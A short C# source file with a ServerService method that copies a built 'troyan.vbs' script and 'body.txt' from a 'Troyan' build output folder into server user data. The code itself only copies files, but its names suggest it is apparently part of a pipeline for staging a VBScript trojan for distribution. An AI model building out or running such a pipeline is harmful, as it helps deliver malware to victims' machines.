namespace Commons;

public partial class ServerService
{
    /// <summary>Copies the built <c>troyan.vbs</c> and <c>body.txt</c> from Troyan <c>_output</c> into server user data (<see cref="ServerLayoutPaths.UserTroyanVbs"/>, <see cref="ServerLayoutPaths.UserBody"/>), replacing any existing files. Creates the user data directory if it does not exist.</summary>
    public void PublishTroyanVbsFromBuildOutput(ServerLayoutPaths layout)
    {
        ArgumentNullException.ThrowIfNull(layout);

        var src = layout.TroyanOutputVbs;
        var dest = layout.UserTroyanVbs;
        if (!File.Exists(src))
            throw new FileNotFoundException("Built troyan.vbs not found in Troyan _output.", src);

        var bodySrc = layout.Body;
        var bodyDest = layout.UserBody;
        if (!File.Exists(bodySrc))
            throw new FileNotFoundException("Built body.txt not found in Troyan _output.", bodySrc);

        var destDir = Path.GetDirectoryName(dest);
        if (!string.IsNullOrEmpty(destDir))
            Directory.CreateDirectory(destDir);

        File.Copy(src, dest, overwrite: true);
        File.Copy(bodySrc, bodyDest, overwrite: true);
    }

    /// <inheritdoc cref="PublishTroyanVbsFromBuildOutput(ServerLayoutPaths)"/>
    public void PublishTroyanVbsFromBuildOutput() => PublishTroyanVbsFromBuildOutput(Layout());
}
